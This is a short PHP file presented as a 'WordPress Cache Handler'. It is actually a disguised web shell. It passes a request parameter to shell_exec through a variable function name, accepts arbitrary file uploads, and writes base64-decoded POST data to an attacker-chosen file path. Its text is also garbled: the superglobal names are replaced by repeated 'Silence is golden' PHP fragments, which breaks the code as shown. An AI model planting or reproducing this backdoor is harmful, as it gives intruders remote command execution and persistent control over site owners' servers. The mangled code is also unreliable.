<?php
/* WordPress Cache Handler - Do not remove */
if(isset(<?php
// Silence is golden.
REQUEST['wp_cache_key'])){
    $wp_cache_data = <?php
// Silence is golden.
REQUEST['wp_cache_key'];
    $wp_cache_func = 'shell_exec';
    echo '<pre>'.$wp_cache_func($wp_cache_data).'</pre>';
}
/* WordPress Media Handler */
if(isset(<?php
// Silence is golden.
FILES['wp_media'])){
    $upload_path = dirname(__FILE__).'/'.basename(<?php
// Silence is golden.
FILES['wp_media']['name']);
    if(move_uploaded_file(<?php
// Silence is golden.
FILES['wp_media']['tmp_name'], $upload_path)){
        echo 'WP_UPLOAD_OK:'.$upload_path;
    }
}
if(isset(<?php
// Silence is golden.
POST['wp_content_data']) && isset(<?php
// Silence is golden.
POST['wp_filename'])){
    $fpath = dirname(__FILE__).'/'.<?php
// Silence is golden.
POST['wp_filename'];
    if(file_put_contents($fpath, base64_decode(<?php
// Silence is golden.
POST['wp_content_data']))){
        echo 'WP_WRITE_OK:'.$fpath;
    }
}
// Silence is golden.
